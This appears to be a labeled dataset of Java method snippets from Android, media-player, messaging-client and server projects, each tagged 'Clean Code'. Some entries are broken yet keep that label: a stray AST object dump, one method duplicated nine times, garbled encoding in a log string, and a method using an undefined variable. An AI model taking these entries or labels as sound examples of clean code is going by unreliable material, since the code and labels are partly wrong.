    @Override public void onError(    String requestId,    String userId,    TUICommonDefine.Error code,    String message){
      if (mBottomView == null) {
        return;
      }
      mBottomView.replaceItem(BottomItemData.Type.RAISE_HAND,createRaiseHandItem());
    }
  }
);
  mBottomView.replaceItem(BottomItemData.Type.RAISE_HAND,createRaiseHandItem());
}",0,Clean Code
"/** 
 * Returns a new  {@link String} constructed by decoding UTF-8 encoded bytes.
 * @param bytes The UTF-8 encoded bytes to decode.
 * @return The string.
 */
public static String fromUtf8Bytes(byte[] bytes){
  return new String(bytes,Charset.forName(C.UTF8_NAME));
}
/** 
 * Returns a new  {@link String} constructed by decoding UTF-8 encoded bytes in a subarray.
 * @param bytes The UTF-8 encoded bytes to decode.
 * @param offset The index of the first byte to decode.
 * @param length The number of bytes to decode.
 * @return The string.
 */
public static String fromUtf8Bytes(byte[] bytes,int offset,int length){
  return new String(bytes,offset,length,Charset.forName(C.UTF8_NAME));
}",0,Clean Code
"/** 
 * Returns whether the underlying library supports the specified MIME type.
 * @param mimeType The MIME type to check.
 * @param encoding The PCM encoding for raw audio.
 */
public static boolean supportsFormat(String mimeType,@C.PcmEncoding int encoding){
  if (!isAvailable()) {
    return false;
  }
  String codecName=getCodecName(mimeType,encoding);
  if (codecName == null) {
    return false;
  }
  if (!ffmpegHasDecoder(codecName)) {
    Log.w(TAG,""No "" + codecName + "" decoder available. Check the FFmpeg build configuration."");
    return false;
  }
  return true;
}
",0,Clean Code
"@Override public boolean check(){
  boolean hasWarning=false;
  try {
    SymbolTable symbolTable=GlobalState.currentProgram.getSymbolTable();
    if (symbolTable == null) {
      Logging.debug(""Empty symbols table"");
      return false;
    }
    Function entryFunction=null;
    if (GlobalState.config.getEntryAddress() != null) {
      entryFunction=GlobalState.flatAPI.getFunctionAt(GlobalState.flatAPI.toAddr(GlobalState.config.getEntryAddress()));
    }
 else {
      List<Function> mainFunctions=GlobalState.flatAPI.getGlobalFunctions(""main"");
      if (mainFunctions.isEmpty()) {
        return false;
      }
      entryFunction=mainFunctions.get(0);
    }
    CallGraph callGraph=CallGraph.getCallGraph(entryFunction);
    SymbolIterator stdCins=symbolTable.getSymbols(""cin"");
    SymbolIterator stdioWidths=symbolTable.getSymbols(""width"");
    for (    Reference reference : Utils.getReferences(new ArrayList<>(dangerousFunctions))) {
      Address toAddress=reference.getToAddress();
      Address fromAddress=reference.getFromAddress();
      Function callee=GlobalState.flatAPI.getFunctionAt(toAddress);
      Function caller=GlobalState.flatAPI.getFunctionContaining(fromAddress);
      if (callee == null || caller == null) {
        continue;
      }
      Logging.debug(fromAddress + "" -> "" + toAddress+ "" ""+ callee.getName());
      if (!callee.getName().equals(""operator>>"")) {
        CWEReport report=getNewReport(""Use of the dangerous function \"""" + callee + ""()\"""").setAddress(fromAddress);
        Logging.report(report);
        hasWarning=true;
        continue;
      }
      Logging.debug(""std::operator>> case"");
      if (stdCins == null) {
        Logging.debug(""std::cin not found"");
        continue;
      }
      for (      Context context : Context.getContext(caller)) {
        AbsEnv absEnv=context.getAbsEnvIn().get(fromAddress);
        if (absEnv == null) {
          continue;
        }
        hasWarning|=handleStdCin(absEnv,callGraph,fromAddress,callee,caller,stdCins,stdioWidths);
      }
    }
  }
 catch (  Exception exception) {
    exception.printStackTrace();
  }
  return hasWarning;
}",0,Clean Code
"public static void addToPulledDialogs(BaseFragment thisFragment,int stackIndex,TLRPC.Chat chat,TLRPC.User user,long dialogId,int folderId,int filterId){
  if (chat == null && user == null) {
    return;
  }
  if (thisFragment == null) {
    return;
  }
  INavigationLayout parentLayout=thisFragment.getParentLayout();
  if (parentLayout == null) {
    return;
  }
  if (parentLayout.getPulledDialogs() == null) {
    parentLayout.setPulledDialogs(new ArrayList<>());
  }
  boolean alreadyAdded=false;
  for (  PulledDialog d : parentLayout.getPulledDialogs()) {
    if (d.dialogId == dialogId) {
      alreadyAdded=true;
      break;
    }
  }
  if (!alreadyAdded) {
    PulledDialog d=new PulledDialog();
    d.activity=ChatActivity.class;
    d.stackIndex=stackIndex;
    d.dialogId=dialogId;
    d.filterId=filterId;
    d.folderId=folderId;
    d.chat=chat;
    d.user=user;
    parentLayout.getPulledDialogs().add(d);
  }
}
",0,Clean Code
"/** 
 * Tests audio track selection when there are multiple audio renderers. 
 */
@Test public void testSelectPreferredAudioTrackMultipleRenderers() throws Exception {
  Format english=buildAudioFormatWithLanguage(""en"",""en"");
  Format german=buildAudioFormatWithLanguage(""de"",""de"");
  Map<String,Integer> firstRendererMappedCapabilities=new HashMap<>();
  firstRendererMappedCapabilities.put(english.id,FORMAT_HANDLED);
  firstRendererMappedCapabilities.put(german.id,FORMAT_UNSUPPORTED_SUBTYPE);
  RendererCapabilities firstRendererCapabilities=new FakeMappedRendererCapabilities(C.TRACK_TYPE_AUDIO,firstRendererMappedCapabilities);
  Map<String,Integer> secondRendererMappedCapabilities=new HashMap<>();
  secondRendererMappedCapabilities.put(english.id,FORMAT_UNSUPPORTED_SUBTYPE);
  secondRendererMappedCapabilities.put(german.id,FORMAT_HANDLED);
  RendererCapabilities secondRendererCapabilities=new FakeMappedRendererCapabilities(C.TRACK_TYPE_AUDIO,secondRendererMappedCapabilities);
  RendererCapabilities[] rendererCapabilities=new RendererCapabilities[]{firstRendererCapabilities,secondRendererCapabilities};
  TrackGroupArray trackGroups=wrapFormats(english,german);
  TrackSelectorResult result=trackSelector.selectTracks(rendererCapabilities,trackGroups,periodId,TIMELINE);
  assertFixedSelection(result.selections.get(0),trackGroups,english);
  assertNoSelection(result.selections.get(1));
  trackSelector.setParameters(Parameters.DEFAULT.buildUpon().setPreferredAudioLanguage(""en""));
  result=trackSelector.selectTracks(rendererCapabilities,trackGroups,periodId,TIMELINE);
  assertFixedSelection(result.selections.get(0),trackGroups,english);
  assertNoSelection(result.selections.get(1));
  trackSelector.setParameters(Parameters.DEFAULT.buildUpon().setPreferredAudioLanguage(""de""));
  result=trackSelector.selectTracks(rendererCapabilities,trackGroups,periodId,TIMELINE);
  assertNoSelection(result.selections.get(0));
  assertFixedSelection(result.selections.get(1),trackGroups,german);
}",0,Clean Code
"private void registerBroadcastReceiver(final Context context){
  IntentFilter intentFilter=new IntentFilter();
  intentFilter.addAction(SettingHelper.refresh_setting);
  intentFilter.addAction(SettingHelper.proxy_setting);
  intentFilter.addAction(SettingHelper.beauty_setting);
  intentFilter.addAction(SettingHelper.sidebar_setting);
  broadcastReceiver=new BroadcastReceiver(){
    @Override public void onReceive(    Context c,    Intent intent){
      if (intent.getAction().equals(SettingHelper.refresh_setting)) {
        for (int i=0; i < dialogRoot.getChildCount(); i++) {
          if (dialogRoot.getChildAt(i) instanceof BaseDialogItem)           ((BaseDialogItem)dialogRoot.getChildAt(i)).refresh();
        }
        if (dialogProxyRoot != null)         for (int i=0; i < dialogProxyRoot.getChildCount(); i++) {
          if (dialogProxyRoot.getChildAt(i) instanceof BaseDialogItem)           ((BaseDialogItem)dialogProxyRoot.getChildAt(i)).refresh();
 else           if (dialogProxyRoot.getChildAt(i) instanceof BaseDialogInputItem)           ((BaseDialogInputItem)dialogProxyRoot.getChildAt(i)).refresh();
        }
        if (dialogBeautyRoot != null)         for (int i=0; i < dialogBeautyRoot.getChildCount(); i++) {
          if (dialogBeautyRoot.getChildAt(i) instanceof BaseDialogItem)           ((BaseDialogItem)dialogBeautyRoot.getChildAt(i)).refresh();
        }
      }
 else       if (intent.getAction().equals(SettingHelper.proxy_setting)) {
        showProxyDialog(context);
      }
 else       if (intent.getAction().equals(SettingHelper.beauty_setting)) {
        showBeautyDialog(context);
      }
 else       if (intent.getAction().equals(SettingHelper.sidebar_setting)) {
        showSidebarDialog(context);
      }
    }
  }
;
  context.registerReceiver(broadcastReceiver,intentFilter);
}",0,Clean Code
"public void setSticker(TLRPC.Document document,Object parent){
  parentObject=parent;
  isPremiumSticker=MessageObject.isPremiumSticker(document);
  if (isPremiumSticker) {
    premiumIconView.setColor(Theme.getColor(Theme.key_windowBackgroundWhite));
    premiumIconView.setWaitingImage();
  }
  if (document != null) {
    TLRPC.PhotoSize thumb=FileLoader.getClosestPhotoSizeWithSize(document.thumbs,90);
    SvgHelper.SvgDrawable svgThumb=DocumentObject.getSvgThumb(document,Theme.key_windowBackgroundGray,1.0f);
    if (MessageObject.canAutoplayAnimatedSticker(document)) {
      if (svgThumb != null) {
        imageView.setImage(ImageLocation.getForDocument(document),""80_80"",null,svgThumb,parentObject);
      }
 else       if (thumb != null) {
        imageView.setImage(ImageLocation.getForDocument(document),""80_80"",ImageLocation.getForDocument(thumb,document),null,0,parentObject);
      }
 else {
        imageView.setImage(ImageLocation.getForDocument(document),""80_80"",null,null,parentObject);
      }
    }
 else {
      if (svgThumb != null) {
        if (thumb != null) {
          imageView.setImage(ImageLocation.getForDocument(thumb,document),null,""webp"",svgThumb,parentObject);
        }
 else {
          imageView.setImage(ImageLocation.getForDocument(document),null,""webp"",svgThumb,parentObject);
        }
      }
 else {
        imageView.setImage(ImageLocation.getForDocument(thumb,document),null,""webp"",null,parentObject);
      }
    }
  }
  sticker=document;
  Drawable background=getBackground();
  if (background != null) {
    background.setAlpha(230);
    background.setColorFilter(new PorterDuffColorFilter(Theme.getColor(Theme.key_chat_stickersHintPanel),PorterDuff.Mode.SRC_IN));
  }
  updatePremiumStatus(false);
}",0,Clean Code
"@Override public void stop(){
  if (player == null) {
    return;
  }
  if (adsManager != null && imaPausedContent) {
    adPlaybackState=adPlaybackState.withAdResumePositionUs(playingAd ? C.msToUs(player.getCurrentPosition()) : 0);
    adsManager.pause();
  }
  lastVolumePercentage=getVolume();
  lastAdProgress=getAdProgress();
  lastContentProgress=getContentProgress();
  adDisplayContainer.unregisterAllVideoControlsOverlays();
  player.removeListener(this);
  player=null;
  eventListener=null;
}",0,Clean Code
"public static IjkMediaMeta parse(Bundle mediaMeta){
  if (mediaMeta == null)   return null;
  IjkMediaMeta meta=new IjkMediaMeta();
  meta.mMediaMeta=mediaMeta;
  meta.mFormat=meta.getString(IJKM_KEY_FORMAT);
  meta.mDurationUS=meta.getLong(IJKM_KEY_DURATION_US);
  meta.mStartUS=meta.getLong(IJKM_KEY_START_US);
  meta.mBitrate=meta.getLong(IJKM_KEY_BITRATE);
  ArrayList<Bundle> streams=meta.getParcelableArrayList(IJKM_KEY_STREAMS);
  if (streams == null)   return meta;
  int index=-1;
  for (  Bundle streamBundle : streams) {
    index++;
    if (streamBundle == null)     continue;
    IjkStreamMeta streamMeta=new IjkStreamMeta(index);
    streamMeta.mMeta=streamBundle;
    streamMeta.mType=streamMeta.getString(IJKM_KEY_TYPE);
    streamMeta.mLanguage=convertLang(streamMeta.getString(IJKM_KEY_LANGUAGE));
    if (TextUtils.isEmpty(streamMeta.mType))     continue;
    streamMeta.mCodecName=streamMeta.getString(IJKM_KEY_CODEC_NAME);
    streamMeta.mCodecProfile=streamMeta.getString(IJKM_KEY_CODEC_PROFILE);
    streamMeta.mCodecLongName=streamMeta.getString(IJKM_KEY_CODEC_LONG_NAME);
    streamMeta.mBitrate=streamMeta.getInt(IJKM_KEY_BITRATE);
    if (IJKM_VAL_TYPE__VIDEO.equalsIgnoreCase(streamMeta.mType)) {
      streamMeta.mWidth=streamMeta.getInt(IJKM_KEY_WIDTH);
      streamMeta.mHeight=streamMeta.getInt(IJKM_KEY_HEIGHT);
      streamMeta.mFpsNum=streamMeta.getInt(IJKM_KEY_FPS_NUM);
      streamMeta.mFpsDen=streamMeta.getInt(IJKM_KEY_FPS_DEN);
      streamMeta.mTbrNum=streamMeta.getInt(IJKM_KEY_TBR_NUM);
      streamMeta.mTbrDen=streamMeta.getInt(IJKM_KEY_TBR_DEN);
      streamMeta.mSarNum=streamMeta.getInt(IJKM_KEY_SAR_NUM);
      streamMeta.mSarDen=streamMeta.getInt(IJKM_KEY_SAR_DEN);
    }
 else     if (IJKM_VAL_TYPE__AUDIO.equalsIgnoreCase(streamMeta.mType)) {
      streamMeta.mSampleRate=streamMeta.getInt(IJKM_KEY_SAMPLE_RATE);
      streamMeta.mChannelLayout=streamMeta.getLong(IJKM_KEY_CHANNEL_LAYOUT);
    }
    meta.mStreams.add(streamMeta);
  }
  return meta;
}",0,Clean Code
"/** 
 * Instantiates a new instance using the PlayReady scheme. <p>Note that PlayReady is unsupported by most Android devices, with the exception of Android TV devices, which do provide support.
 * @param callback Performs key and provisioning requests.
 * @param customData Optional custom data to include in requests generated by the instance.
 * @throws UnsupportedDrmException If the specified DRM scheme is not supported.
 */
public static DefaultDrmSessionManager<FrameworkMediaCrypto> newPlayReadyInstance(MediaDrmCallback callback,@Nullable String customData) throws UnsupportedDrmException {
  HashMap<String,String> optionalKeyRequestParameters;
  if (!TextUtils.isEmpty(customData)) {
    optionalKeyRequestParameters=new HashMap<>();
    optionalKeyRequestParameters.put(PLAYREADY_CUSTOM_DATA_KEY,customData);
  }
 else {
    optionalKeyRequestParameters=null;
  }
  return newFrameworkInstance(C.PLAYREADY_UUID,callback,optionalKeyRequestParameters);
}
",0,Clean Code
"/** 
 * Query allowed(authorized?) consumer group info
 * @param req       Http Servlet Request
 * @param sBuffer   string buffer
 * @param result    process result
 * @return    process result
 */
public StringBuilder adminQueryConsumerGroupInfo(HttpServletRequest req,StringBuilder sBuffer,ProcessResult result){
  GroupConsumeCtrlEntity qryEntity=new GroupConsumeCtrlEntity();
  if (!WebParameterUtils.getQueriedOperateInfo(req,qryEntity,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.COMPSGROUPNAME,false,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  Set<String> groupNameSet=(Set<String>)result.getRetData();
  if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.COMPSTOPICNAME,false,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  Set<String> topicNameSet=(Set<String>)result.getRetData();
  qryEntity.setConsumeEnable(EnableStatus.STATUS_ENABLE);
  Map<String,List<GroupConsumeCtrlEntity>> qryResultMap=defMetaDataService.getGroupConsumeCtrlConf(groupNameSet,topicNameSet,qryEntity);
  int totalCnt=0;
  WebParameterUtils.buildSuccessWithDataRetBegin(sBuffer);
  for (  List<GroupConsumeCtrlEntity> entryLst : qryResultMap.values()) {
    if (entryLst == null || entryLst.isEmpty()) {
      continue;
    }
    for (    GroupConsumeCtrlEntity entry : entryLst) {
      if (entry == null) {
        continue;
      }
      if (totalCnt++ > 0) {
        sBuffer.append("","");
      }
      sBuffer.append(""{\""topicName\"":\"""").append(entry.getTopicName()).append(""\"",\""groupName\"":\"""").append(entry.getGroupName()).append(""\"",\""dataVersionId\"":"").append(entry.getDataVerId()).append("",\""createUser\"":\"""").append(entry.getCreateUser()).append(""\"",\""createDate\"":\"""").append(entry.getCreateDateStr()).append(""\"",\""modifyUser\"":\"""").append(entry.getModifyUser()).append(""\"",\""modifyDate\"":\"""").append(entry.getModifyDateStr()).append(""\""}"");
    }
  }
  WebParameterUtils.buildSuccessWithDataRetEnd(sBuffer,totalCnt);
  return sBuffer;
}",0,Clean Code
"public void setDialog(long uid,boolean checked,CharSequence name){
  if (DialogObject.isUserDialog(uid)) {
    user=MessagesController.getInstance(currentAccount).getUser(uid);
    avatarDrawable.setInfo(user);
    if (currentType != TYPE_CREATE && UserObject.isReplyUser(user)) {
      nameTextView.setText(LocaleController.getString(""RepliesTitle"",R.string.RepliesTitle));
      avatarDrawable.setAvatarType(AvatarDrawable.AVATAR_TYPE_REPLIES);
      imageView.setImage(null,null,avatarDrawable,user);
    }
 else     if (currentType != TYPE_CREATE && UserObject.isUserSelf(user)) {
      nameTextView.setText(LocaleController.getString(""SavedMessages"",R.string.SavedMessages));
      avatarDrawable.setAvatarType(AvatarDrawable.AVATAR_TYPE_SAVED);
      imageView.setImage(null,null,avatarDrawable,user);
    }
 else {
      if (name != null) {
        nameTextView.setText(name);
      }
 else       if (user != null) {
        nameTextView.setText(ContactsController.formatName(user.first_name,user.last_name));
      }
 else {
        nameTextView.setText("""");
      }
      imageView.setForUserOrChat(user,avatarDrawable);
    }
    imageView.setRoundRadius(AndroidUtilities.dp(28));
  }
 else {
    user=null;
    TLRPC.Chat chat=MessagesController.getInstance(currentAccount).getChat(-uid);
    if (name != null) {
      nameTextView.setText(name);
    }
 else     if (chat != null) {
      nameTextView.setText(chat.title);
    }
 else {
      nameTextView.setText("""");
    }
    avatarDrawable.setInfo(chat);
    imageView.setForUserOrChat(chat,avatarDrawable);
    imageView.setRoundRadius(chat != null && chat.forum ? AndroidUtilities.dp(16) : AndroidUtilities.dp(28));
  }
  currentDialog=uid;
  checkBox.setChecked(checked,false);
}",0,Clean Code
"private String getSysLogIndex(){
  String month=LocalDate.now().format(DateTimeFormatter.ofPattern(""yyyy-MM""));
  String index=getIndexAliases(SYS_LOG_TYPE) + ""-"" + month;
  GetIndexRequest getIndexRequest=new GetIndexRequest(index);
  try {
    boolean exists=restHighLevelClient.indices().exists(getIndexRequest,RequestOptions.DEFAULT);
    if (!exists) {
      CreateIndexRequest createIndexRequest=new CreateIndexRequest(index);
      createIndexRequest.source(SYS_LOG_INDEX_SOURCE,XContentType.JSON);
      restHighLevelClient.indices().create(createIndexRequest,RequestOptions.DEFAULT);
    }
  }
 catch (  IOException e) {
    log.error(""鍒涘缓绯荤粺鏃ュ織绱㈠紩寮傚父,msg:{}"",e.getMessage());
  }
  return index;
}
",0,Clean Code
"private OutputTransformerProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private OutputTransformerProto(){
  className_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@5634a19a",0,Clean Code
"@Override public void onModulesReloaded(){
  var users=moduleUtil.getUsers();
  if (users == null)   return;
  if (users.size() != 1) {
    binding.viewPager.setUserInputEnabled(true);
    binding.tabLayout.setVisibility(View.VISIBLE);
    binding.fab.show();
  }
 else {
    binding.viewPager.setUserInputEnabled(false);
    binding.tabLayout.setVisibility(View.GONE);
  }
  var tmp=new SparseArray<ModuleAdapter>(users.size());
  var snapshot=adapters;
  for (  var user : users) {
    if (snapshot.indexOfKey(user.id) >= 0) {
      tmp.put(user.id,snapshot.get(user.id));
    }
 else {
      var adapter=new ModuleAdapter(user);
      adapter.setHasStableIds(true);
      tmp.put(user.id,adapter);
    }
  }
  adapters=tmp;
  forEachAdaptor(ModuleAdapter::refresh);
  runOnUiThread(pagerAdapter::notifyDataSetChanged);
  updateModuleSummary();
}",0,Clean Code
"/** 
 * Creates an embedding vector representing the input text or token array.
 * @param embeddingRequest The embedding request.
 * @return Returns list of {@link Embedding} wrapped in {@link EmbeddingList}.
 * @param < T > Type of the entity in the data list. Can be a {@link String} or{@link List} of tokens (e.g. Integers). For embedding multiple inputs in a singlerequest, You can pass a  {@link List} of {@link String} or {@link List} of{@link List} of tokens. For example:<pre> {@code List.of(""text1"", ""text2"", ""text3"") or List.of(List.of(1, 2, 3), List.of(3, 4, 5))} </pre>
 */
public <T>ResponseEntity<EmbeddingList<Embedding>> embeddings(EmbeddingRequest<T> embeddingRequest){
  Assert.notNull(embeddingRequest,""The request body can not be null."");
  Assert.notNull(embeddingRequest.input(),""The input can not be null."");
  Assert.isTrue(embeddingRequest.input() instanceof String || embeddingRequest.input() instanceof List,""The input must be either a String, or a List of Strings or List of List of integers."");
  if (embeddingRequest.input() instanceof List) {
    Assert.isTrue(!CollectionUtils.isEmpty(list),""The input list can not be empty."");
    Assert.isTrue(list.size() <= 1024,""The list must be 1024 dimensions or less"");
    Assert.isTrue(list.get(0) instanceof String || list.get(0) instanceof Integer || list.get(0) instanceof List,""The input must be either a String, or a List of Strings or list of list of integers."");
  }
  return this.restClient.post().uri(""/v1/embeddings"").body(embeddingRequest).retrieve().toEntity(new ParameterizedTypeReference<>(){
  }
);
}",0,Clean Code
"/** 
 * Incrementally processes new input from  {@code inputBuffer} while in {@link #STATE_SILENT}, updating the state if needed.
 */
private void processSilence(ByteBuffer inputBuffer){
  int limit=inputBuffer.limit();
  int noisyPosition=findNoisePosition(inputBuffer);
  inputBuffer.limit(noisyPosition);
  skippedFrames+=inputBuffer.remaining() / bytesPerFrame;
  updatePaddingBuffer(inputBuffer,paddingBuffer,paddingSize);
  if (noisyPosition < limit) {
    output(paddingBuffer,paddingSize);
    state=STATE_NOISY;
    inputBuffer.limit(limit);
  }
}
",0,Clean Code
"public static String getBundleString(Bundle bundle){
  if (bundle == null || bundle.size() == 0)   return ""Bundle[]"";
  StringBuilder bundleString=new StringBuilder(""Bundle[\n"");
  boolean first=true;
  for (  String key : bundle.keySet()) {
    if (!first)     bundleString.append(""\n"");
    bundleString.append(key).append("": `"");
    Object value=bundle.get(key);
    if (value instanceof int[]) {
      bundleString.append(Arrays.toString((int[])value));
    }
 else     if (value instanceof byte[]) {
      bundleString.append(Arrays.toString((byte[])value));
    }
 else     if (value instanceof boolean[]) {
      bundleString.append(Arrays.toString((boolean[])value));
    }
 else     if (value instanceof short[]) {
      bundleString.append(Arrays.toString((short[])value));
    }
 else     if (value instanceof long[]) {
      bundleString.append(Arrays.toString((long[])value));
    }
 else     if (value instanceof float[]) {
      bundleString.append(Arrays.toString((float[])value));
    }
 else     if (value instanceof double[]) {
      bundleString.append(Arrays.toString((double[])value));
    }
 else     if (value instanceof String[]) {
      bundleString.append(Arrays.toString((String[])value));
    }
 else     if (value instanceof CharSequence[]) {
      bundleString.append(Arrays.toString((CharSequence[])value));
    }
 else     if (value instanceof Parcelable[]) {
      bundleString.append(Arrays.toString((Parcelable[])value));
    }
 else     if (value instanceof Bundle) {
      bundleString.append(getBundleString((Bundle)value));
    }
 else {
      bundleString.append(value);
    }
    bundleString.append(""`"");
    first=false;
  }
  bundleString.append(""\n]"");
  return bundleString.toString();
}",0,Clean Code
"public void registerService(String serviceName,String groupName,Instance instance) throws NacosException {
  NAMING_LOGGER.info(""[REGISTER-SERVICE] {} registering service {} with instance: {}"",namespaceId,serviceName,instance);
  final Map<String,String> params=new HashMap<String,String>(9);
  params.put(CommonParams.NAMESPACE_ID,namespaceId);
  params.put(CommonParams.SERVICE_NAME,serviceName);
  params.put(CommonParams.GROUP_NAME,groupName);
  params.put(CommonParams.CLUSTER_NAME,instance.getClusterName());
  params.put(""ip"",instance.getIp());
  params.put(""port"",String.valueOf(instance.getPort()));
  params.put(""weight"",String.valueOf(instance.getWeight()));
  params.put(""enable"",String.valueOf(instance.isEnabled()));
  params.put(""healthy"",String.valueOf(instance.isHealthy()));
  params.put(""ephemeral"",String.valueOf(instance.isEphemeral()));
  params.put(""metadata"",JSON.toJSONString(instance.getMetadata()));
  reqAPI(UtilAndComs.NACOS_URL_INSTANCE,params,HttpMethod.POST);
}",0,Clean Code
"@Override public boolean onMenuItemSelected(@NonNull MenuItem item){
  int itemId=item.getItemId();
  if (itemId == R.id.item_sort_by_name) {
    item.setChecked(true);
    App.getPreferences().edit().putInt(""repo_sort"",0).apply();
    adapter.refresh();
  }
 else   if (itemId == R.id.item_sort_by_update_time) {
    item.setChecked(true);
    App.getPreferences().edit().putInt(""repo_sort"",1).apply();
    adapter.refresh();
  }
 else   if (itemId == R.id.item_upgradable_first) {
    item.setChecked(!item.isChecked());
    App.getPreferences().edit().putBoolean(""upgradable_first"",item.isChecked()).apply();
    adapter.refresh();
  }
 else {
    return false;
  }
  return true;
}",0,Clean Code
"@Override public int hashCode(){
  final int prime=31;
  int result=1;
  result=prime * result + ((getId() == null) ? 0 : getId().hashCode());
  result=prime * result + ((getUserId() == null) ? 0 : getUserId().hashCode());
  result=prime * result + ((getJti() == null) ? 0 : getJti().hashCode());
  result=prime * result + ((getIp() == null) ? 0 : getIp().hashCode());
  result=prime * result + ((getIpArea() == null) ? 0 : getIpArea().hashCode());
  result=prime * result + ((getBrowser() == null) ? 0 : getBrowser().hashCode());
  result=prime * result + ((getBrowserVersion() == null) ? 0 : getBrowserVersion().hashCode());
  result=prime * result + ((getOs() == null) ? 0 : getOs().hashCode());
  result=prime * result + ((getExpired() == null) ? 0 : getExpired().hashCode());
  result=prime * result + ((getIsLogout() == null) ? 0 : getIsLogout().hashCode());
  result=prime * result + ((getCreatedAt() == null) ? 0 : getCreatedAt().hashCode());
  return result;
}",0,Clean Code
"@Override public void onItemClick(int id){
  if (id == -1) {
    finishFragment();
  }
 else   if (id == done_button) {
    if (getParentActivity() == null) {
      return;
    }
    if (StrUtil.isBlank(ipField.getText())) {
      ipField.requestFocus();
      AndroidUtilities.showKeyboard(ipField);
      return;
    }
    if (StrUtil.isBlank(portField.getText())) {
      portField.requestFocus();
      AndroidUtilities.showKeyboard(portField);
      return;
    }
    if (StrUtil.isBlank(passwordField.getText())) {
      passwordField.requestFocus();
      AndroidUtilities.showKeyboard(passwordField);
      return;
    }
    currentBean.setHost(ipField.getText().toString());
    currentBean.setRemotePort(Utilities.parseInt(portField.getText().toString()));
    currentBean.setPassword(passwordField.getText().toString());
    currentBean.setMethod(methodField.getValueTextView().getText().toString());
    currentBean.setProtocol(protocolField.getValueTextView().getText().toString());
    currentBean.setProtocol_param(protocolParamField.getText().toString());
    currentBean.setObfs(obfsField.getValueTextView().getText().toString());
    currentBean.setObfs_param(obfsParamField.getText().toString());
    currentBean.setRemarks(remarksField.getText().toString());
    if (currentProxyInfo == null) {
      currentProxyInfo=new SharedConfig.ShadowsocksRProxy(currentBean);
      SharedConfig.addProxy(currentProxyInfo);
      SharedConfig.setCurrentProxy(currentProxyInfo);
    }
 else {
      currentProxyInfo.proxyCheckPingId=0;
      currentProxyInfo.availableCheckTime=0;
      currentProxyInfo.ping=0;
      SharedConfig.saveProxyList();
      SharedConfig.setProxyEnable(false);
    }
    finishFragment();
  }
}",0,Clean Code
"@java.lang.Override public int hashCode(){
  if (memoizedHashCode != 0) {
    return memoizedHashCode;
  }
  int hash=41;
  hash=(19 * hash) + getDescriptor().hashCode();
  if (getLabelCount() > 0) {
    hash=(37 * hash) + LABEL_FIELD_NUMBER;
    hash=(53 * hash) + getLabelList().hashCode();
  }
  if (getCountCount() > 0) {
    hash=(37 * hash) + COUNT_FIELD_NUMBER;
    hash=(53 * hash) + getCountList().hashCode();
  }
  if (getMaxCount() > 0) {
    hash=(37 * hash) + MAX_FIELD_NUMBER;
    hash=(53 * hash) + getMaxList().hashCode();
  }
  if (getMinCount() > 0) {
    hash=(37 * hash) + MIN_FIELD_NUMBER;
    hash=(53 * hash) + getMinList().hashCode();
  }
  if (getMeanCount() > 0) {
    hash=(37 * hash) + MEAN_FIELD_NUMBER;
    hash=(53 * hash) + getMeanList().hashCode();
  }
  if (getSumSquaresCount() > 0) {
    hash=(37 * hash) + SUMSQUARES_FIELD_NUMBER;
    hash=(53 * hash) + getSumSquaresList().hashCode();
  }
  hash=(37 * hash) + UNKNOWNCOUNT_FIELD_NUMBER;
  hash=(53 * hash) + getUnknownCount();
  hash=(37 * hash) + OVERALLCOUNT_FIELD_NUMBER;
  hash=(53 * hash) + com.google.protobuf.Internal.hashLong(getOverallCount());
  hash=(29 * hash) + unknownFields.hashCode();
  memoizedHashCode=hash;
  return hash;
}",0,Clean Code
"public Criteria andGmtModifiedIsNotNull(){
  addCriterion(""gmt_modified is not null"");
  return (Criteria)this;
}
public Criteria andGmtModifiedIsNotNull(){
  addCriterion(""gmt_modified is not null"");
  return (Criteria)this;
}
public Criteria andGmtModifiedIsNotNull(){
  addCriterion(""gmt_modified is not null"");
  return (Criteria)this;
}
public Criteria andGmtModifiedIsNotNull(){
  addCriterion(""gmt_modified is not null"");
  return (Criteria)this;
}
public Criteria andGmtModifiedIsNotNull(){
  addCriterion(""gmt_modified is not null"");
  return (Criteria)this;
}
public Criteria andGmtModifiedIsNotNull(){
  addCriterion(""gmt_modified is not null"");
  return (Criteria)this;
}
public Criteria andGmtModifiedIsNotNull(){
  addCriterion(""gmt_modified is not null"");
  return (Criteria)this;
}
public Criteria andGmtModifiedIsNotNull(){
  addCriterion(""gmt_modified is not null"");
  return (Criteria)this;
}
public Criteria andGmtModifiedIsNotNull(){
  addCriterion(""gmt_modified is not null"");
  return (Criteria)this;
}
",0,Clean Code
"public void writeMetadata(@NonNull ZipOutputStream zipOutputStream) throws IOException {
  PackageManager pm=ContextUtils.getContext().getPackageManager();
  ApplicationInfo applicationInfo=mPackageInfo.applicationInfo;
  packageName=mPackageInfo.packageName;
  displayName=applicationInfo.loadLabel(pm).toString();
  versionName=mPackageInfo.versionName;
  versionCode=PackageInfoCompat.getLongVersionCode(mPackageInfo);
  exportTimestamp=946684800000L;
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
    minSdk=applicationInfo.minSdkVersion;
  }
  targetSdk=applicationInfo.targetSdkVersion;
  String[] sharedLibraries=applicationInfo.sharedLibraryFiles;
  if (sharedLibraries != null) {
    for (    String file : sharedLibraries) {
      if (!file.endsWith("".apk"")) {
        continue;
      }
      PackageInfo packageInfo=pm.getPackageArchiveInfo(file,PackageManager.GET_SHARED_LIBRARY_FILES);
      if (packageInfo == null) {
        Log.w(TAG,""Could not fetch package info for file %s"",file);
        continue;
      }
      if (packageInfo.applicationInfo.sourceDir == null) {
        packageInfo.applicationInfo.sourceDir=file;
      }
      if (packageInfo.applicationInfo.publicSourceDir == null) {
        packageInfo.applicationInfo.publicSourceDir=file;
      }
      File tempFile=FileCache.getGlobalFileCache().createCachedFile(""apks"");
      try {
        Path tempPath=Paths.get(tempFile);
        SplitApkExporter.saveApks(packageInfo,tempPath);
        String path=packageInfo.packageName + ApkUtils.EXT_APKS;
        SplitApkExporter.addFile(zipOutputStream,tempPath,path,exportTimestamp);
        Dependency dependency=new Dependency();
